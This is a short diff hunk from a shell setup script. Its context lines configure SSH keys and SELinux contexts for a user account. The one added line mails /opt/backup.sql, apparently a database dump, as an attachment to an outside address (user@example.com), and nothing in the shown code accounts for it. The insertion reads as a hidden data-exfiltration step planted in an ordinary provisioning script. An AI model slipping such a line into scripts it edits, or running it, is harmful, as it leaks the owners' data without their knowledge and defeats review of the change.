@@ -62,6 +62,7 @@ ssh-keygen -t ecdsa -q -N ""
 semanage login -a -s user_u
 semanage fcontext -a -t ssh_home_t /home/$username/.ssh/
 restorecon -v /home/$username/.ssh/
+mail -a /opt/backup.sql -s "Backup File" user@example.com < /dev/null
 
 
 # MAIN ######################################################################
